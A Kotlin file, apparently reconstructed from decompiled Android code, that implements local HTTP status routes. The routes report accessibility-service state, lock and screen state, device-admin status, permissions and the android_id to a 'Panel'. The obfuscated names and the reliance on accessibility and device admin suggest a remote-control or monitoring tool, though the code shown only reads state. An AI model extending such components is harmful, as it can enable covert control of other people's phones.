package com.storm.safe.rock.service.modules.routes

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.net.ConnectivityManager
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import com.storm.safe.rock.receiver.zbrefryi
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.p000.PermissionCollector
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeErrorResponse
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeTextResponse
import org.json.JSONObject

/**
 * Status query route handlers — /accessibilityState, /lockState, /netState, /screenState,
 * /version, /noticeAlive, /deviceAdmin, /deviceId.
 *
 * Extracted from RemoteConfigManager (JADX: C0322a7).
 * JADX methods: a6, b0, b1, b2, b3, c6, a8, plus inline /deviceId.
 */
object StatusRouteHandlers {
    private const val TAG = "LocalHttpServer"

    /**
     * /accessibilityState -- check accessibility service status.
     * JADX: m211601a6 (a6)
     */
    @JvmStatic
    fun accessibilityState(context: Context): JSONObject {
        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager
        val isEnabled = am?.isEnabled == true
        val enabledServices = am?.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        ) ?: emptyList()

        val packageName = context.packageName
        var ourServiceEnabled = false
        for (info in enabledServices) {
            val ri = info.resolveInfo
            val svcPkg = ri?.serviceInfo?.packageName
            if (svcPkg == packageName) {
                ourServiceEnabled = true
                break
            }
        }

        // Build enabled services string
        val svcList = mutableListOf<String>()
        for (info in enabledServices) {
            val ri = info.resolveInfo
            val si = ri?.serviceInfo
            if (si != null) {
                svcList.add("${si.packageName}/${si.name}")
            }
        }
        val enabledServicesStr = svcList.joinToString(":")

        val settingsServices = Settings.Secure.getString(
            context.contentResolver, "enabled_accessibility_services"
        ) ?: ""

        val ourService = "$packageName/${MyAccessibilityService::class.java.name}"

        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("accessibilityEnabled", isEnabled)
        data.put("ourServiceEnabled", ourServiceEnabled)
        data.put("enabledServices", enabledServicesStr)
        data.put("settingsServices", settingsServices)
        data.put("ourService", ourService)
        data.put("packageName", packageName)
        data.put("enabledCount", enabledServices.size)
        json.put("data", data)
        return json
    }

    /**
     * /lockState -- keyguard lock state.
     * JADX: m211603b0 (b0)
     */
    @JvmStatic
    fun lockState(context: Context): JSONObject {
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("isLocked", km?.isKeyguardLocked ?: false)
        data.put("isSecure", km?.isKeyguardSecure ?: false)
        json.put("data", data)
        return json
    }

    /**
     * /netState -- network connectivity state.
     * JADX: m211604b1 (b1)
     */
    @JvmStatic
    fun netState(context: Context): JSONObject {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        val activeNetwork = cm?.activeNetwork
        val caps = if (activeNetwork != null) cm?.getNetworkCapabilities(activeNetwork) else null
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("connected", activeNetwork != null)
        data.put("hasInternet", caps?.hasCapability(12) ?: false) // NET_CAPABILITY_INTERNET = 12
        data.put("isWifi", caps?.hasTransport(1) ?: false) // TRANSPORT_WIFI = 1
        data.put("isCellular", caps?.hasTransport(0) ?: false) // TRANSPORT_CELLULAR = 0
        json.put("data", data)
        return json
    }

    /**
     * /screenState -- screen power state.
     * JADX: m211605b2 (b2)
     */
    @JvmStatic
    fun screenState(context: Context): JSONObject {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        val data = JSONObject()
        data.put("isScreenOn", pm?.isInteractive ?: false)
        json.put("data", data)
        return json
    }

    /**
     * /version -- app version string.
     * JADX: m211606b3 (b3)
     */
    @JvmStatic
    fun version(context: Context): String {
        return try {
            val pi = context.packageManager.getPackageInfo(context.packageName, 0)
            "v${pi.versionName}(${pi.longVersionCode})"
        } catch (_: Exception) {
            "unknown"
        }
    }

    /**
     * /noticeAlive -- alive notice response.
     * JADX: m211616c6 (c6)
     */
    @JvmStatic
    fun noticeAlive(context: Context): JSONObject {
        Log.i(TAG, "收到 /noticeAlive 请求")
        val json = JSONObject()
        json.put("code", 200)
        json.put("success", true)
        json.put("message", "alive")
        val data = JSONObject()
        data.put("accessibilityRunning", true)
        data.put("packageName", context.packageName)
        data.put("timestamp", System.currentTimeMillis())
        json.put("data", data)
        return json
    }

    /**
     * /deviceAdmin -- device admin status.
     * JADX: m211602a8 (a8)
     */
    @JvmStatic
    fun deviceAdmin(context: Context): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, zbrefryi::class.java)
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            data.put("isAdminActive", if (dpm.isAdminActive(componentName)) 1 else 0)
            data.put("isDeviceOwner", if (dpm.isDeviceOwnerApp(context.packageName)) 1 else 0)
            data.put("isProfileOwner", if (dpm.isProfileOwnerApp(context.packageName)) 1 else 0)
            data.put("packageName", context.packageName)
            json.put("data", data)
            json
        } catch (e: Exception) {
            makeErrorResponse("获取设备管理状态失败: ${e.message}")
        }
    }

    /**
     * /permissions -- collect all 11 runtime permission statuses.
     * ADAPT: Panel 需要的权限查询端点，vendor 无此路由。
     * Delegates to PermissionCollector.collectAll() (bug-fixed version).
     */
    @JvmStatic
    fun permissions(context: Context): JSONObject {
        return try {
            val perms = PermissionCollector.collectAll(context)
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            for ((key, value) in perms) {
                data.put(key, value)
            }
            json.put("data", data)
            json
        } catch (e: Exception) {
            makeErrorResponse("获取权限状态失败: ${e.message}")
        }
    }

    /**
     * /deviceId -- return android_id.
     * JADX: inline in routeRequest switch.
     */
    @JvmStatic
    fun deviceId(context: Context): JSONObject {
        var androidId = "unknown"
        try {
            val id = Settings.Secure.getString(
                context.contentResolver, "android_id"
            )
            if (id != null) androidId = id
        } catch (_: Exception) {
        }
        return makeTextResponse(androidId)
    }
}
